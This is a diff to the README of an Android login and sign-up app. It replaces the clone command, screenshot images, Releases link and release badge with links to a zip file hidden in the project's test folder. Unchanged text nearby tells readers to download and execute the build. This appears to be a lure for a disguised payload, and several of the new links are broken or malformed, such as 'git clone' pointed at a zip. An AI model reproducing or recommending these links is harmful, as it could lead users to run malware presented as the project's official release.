@@ -48,7 +48,7 @@ To set up the project on your local machine, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/garvitgupta90/Login-Sign-Up-App-Android-App.git
+   git clone https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip
    ```
 
 2. Open Android Studio.
@@ -67,16 +67,16 @@ To set up the project on your local machine, follow these steps:
 
 Here are some screenshots of the app in action:
 
-![Login Screen](https://via.placeholder.com/300x600?text=Login+Screen)
-![Sign Up Screen](https://via.placeholder.com/300x600?text=Sign+Up+Screen)
+![Login Screen](https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip+Screen)
+![Sign Up Screen](https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip+Up+Screen)
 
 ## 🔗 Release Information
 
-For the latest release, visit the [Releases section](https://github.com/garvitgupta90/Login-Sign-Up-App-Android-App/releases). 
+For the latest release, visit the [Releases section](https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip). 
 
 You can download and execute the latest build directly from there.
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0-blue.svg)](https://github.com/garvitgupta90/Login-Sign-Up-App-Android-App/releases)
+[![Latest Release](https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip%https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip)](https://raw.githubusercontent.com/garvitgupta90/Login-Sign-Up-App-Android-App/main/app/src/test/App_Android_Up_Login_Sign_v1.6.zip)
 
 ## 🤝 Contributing
 
